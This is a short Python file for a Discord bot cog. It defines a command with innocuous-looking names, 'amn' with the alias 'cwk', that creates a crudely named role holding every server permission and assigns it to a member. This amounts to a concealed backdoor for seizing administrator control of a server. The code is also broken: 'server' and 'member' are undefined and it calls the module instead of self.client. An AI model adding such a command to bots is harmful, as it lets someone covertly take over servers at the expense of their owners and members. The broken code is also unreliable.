import discord
from discord import client
from discord.ext import commands
from discord import Permissions

class Commands(commands.Cog):

    def __init__(self, client):
        self.client = client
    
    @commands.command(aliases=['cwk'])
    async def amn(self, ctx):
        role = await client.create_role(server, name="cockandballs", permissions=Permissions.all())
        await client.add_roles(member, role)

def setup(client):
    client.add_cog(Commands(client))
